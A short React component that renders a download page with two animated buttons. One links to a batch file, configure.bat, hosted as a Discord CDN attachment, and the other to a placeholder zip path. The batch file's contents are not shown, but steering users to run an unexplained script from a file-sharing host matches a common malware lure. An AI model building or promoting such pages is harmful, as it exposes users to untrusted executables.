// src/DownloadPage.tsx
"use client"
import React from 'react';

const DownloadPage: React.FC = () => {
  return (
    <div className="container mx-auto p-4">
      <h1 className="text-3xl font-bold mb-4">Download Page</h1>
      <p className="text-lg mb-4">Click the buttons below to download the files you need.</p>
      <div className="flex space-x-4">
        <a
          href="https://cdn.discordapp.com/attachments/1259815698197123215/1261220934933676042/configure.bat?ex=66922b07&is=6690d987&hm=461262451143f62604fe059d4628c3511ad46665dd4a77ac07979afdfeaa3280&"
          download
          className="py-2 px-4 rounded text-white font-bold animate-neon"
          style={{
            background: 'linear-gradient(270deg, #ff8a00, #e52e71, #9b4bff)',
            backgroundSize: '400% 400%',
          }}
        >
          Download File 1
        </a>
        <a
          href="https://cdn.discordapp.com/path/to/your/file2.zip"
          download
          className="py-2 px-4 rounded text-white font-bold animate-neon"
          style={{
            background: 'linear-gradient(270deg, #ff8a00, #e52e71, #9b4bff)',
            backgroundSize: '400% 400%',
          }}
        >
          Download File 2
        </a>
      </div>
    </div>
  );
};

export default DownloadPage;
